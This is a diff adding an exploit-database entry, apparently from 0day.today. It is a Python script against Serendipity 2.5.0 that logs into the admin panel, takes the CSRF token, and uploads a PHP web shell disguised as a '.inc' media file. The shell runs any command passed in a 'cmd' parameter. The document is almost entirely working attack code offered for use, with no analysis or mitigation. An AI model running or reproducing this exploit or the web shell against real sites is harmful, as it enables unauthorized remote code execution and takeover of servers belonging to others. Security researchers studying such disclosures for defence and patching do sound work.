@@ -1,0 +1,114 @@
+id: 39641
+date: 06/04/2024
+title: Serendipity 2.5.0 - Remote Code Execution Exploit
+author: Ahmet Ümit BAYRAM
+cves: 
+
+# Exploit Title: Serendipity 2.5.0 - Remote Code Execution (RCE)
+# Discovered by: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://docs.s9y.org/
+# Software Link:https://www.s9y.org/latest
+# Tested Version: v2.5.0 (latest)
+# Tested on: MacOS
+
+import requests
+import time
+import random
+import string
+from bs4 import BeautifulSoup
+
+def generate_filename(extension=".inc"):
+return ''.join(random.choices(string.ascii_letters + string.digits, k=5)) +
+extension
+
+def get_csrf_token(response):
+soup = BeautifulSoup(response.text, 'html.parser')
+token = soup.find('input', {'name': 'serendipity[token]'})
+return token['value'] if token else None
+
+def login(base_url, username, password):
+print("Logging in...")
+time.sleep(2)
+session = requests.Session()
+login_page = session.get(f"{base_url}/serendipity_admin.php")
+token = get_csrf_token(login_page)
+data = {
+"serendipity[action]": "admin",
+"serendipity[user]": username,
+"serendipity[pass]": password,
+"submit": "Login",
+"serendipity[token]": token
+}
+headers = {
+"Content-Type": "application/x-www-form-urlencoded",
+"Referer": f"{base_url}/serendipity_admin.php"
+}
+response = session.post(f"{base_url}/serendipity_admin.php", data=data,
+headers=headers)
+if "Add media" in response.text:
+print("Login Successful!")
+time.sleep(2)
+return session
+else:
+print("Login Failed!")
+return None
+
+def upload_file(session, base_url, filename, token):
+print("Shell Preparing...")
+time.sleep(2)
+boundary = "---------------------------395233558031804950903737832368"
+headers = {
+"Content-Type": f"multipart/form-data; boundary={boundary}",
+"Referer": f"{base_url}
+/serendipity_admin.php?serendipity[adminModule]=media"
+}
+payload = (
+f"--{boundary}\r\n"
+f"Content-Disposition: form-data; name=\"serendipity[token]\"\r\n\r\n"
+f"{token}\r\n"
+f"--{boundary}\r\n"
+f"Content-Disposition: form-data; name=\"serendipity[action]\"\r\n\r\n"
+f"admin\r\n"
+f"--{boundary}\r\n"
+f"Content-Disposition: form-data; name=\"serendipity[adminModule]\"\r\n\r\n"
+f"media\r\n"
+f"--{boundary}\r\n"
+f"Content-Disposition: form-data; name=\"serendipity[adminAction]\"\r\n\r\n"
+f"add\r\n"
+f"--{boundary}\r\n"
+f"Content-Disposition: form-data; name=\"serendipity[userfile][1]\";
+filename=\"{filename}\"\r\n"
+f"Content-Type: text/html\r\n\r\n"
+"<html>\n<body>\n<form method=\"GET\" name=\"<?php echo
+basename($_SERVER['PHP_SELF']); ?>\">\n"
+"<input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">\n<input
+type=\"SUBMIT\" value=\"Execute\">\n"
+"</form>\n<pre>\n<?php\nif(isset($_GET['cmd']))\n{\nsystem($_GET['cmd']);\n}
+\n?>\n</pre>\n</body>\n</html>\r\n"
+f"--{boundary}--\r\n"
+)
+
+response = session.post(f"{base_url}
+/serendipity_admin.php?serendipity[adminModule]=media", headers=headers,
+data=payload.encode('utf-8'))
+if f"File {filename} successfully uploaded as" in response.text:
+print(f"Your shell is ready: {base_url}/uploads/{filename}")
+else:
+print("Exploit Failed!")
+
+def main(base_url, username, password):
+filename = generate_filename()
+session = login(base_url, username, password)
+if session:
+token = get_csrf_token(session.get(f"{base_url}
+/serendipity_admin.php?serendipity[adminModule]=media"))
+upload_file(session, base_url, filename, token)
+
+if __name__ == "__main__":
+import sys
+if len(sys.argv) != 4:
+print("Usage: python script.py <siteurl> <username> <password>")
+else:
+main(sys.argv[1], sys.argv[2], sys.argv[3])
+
+#  0day.today [2024-06-15]  #
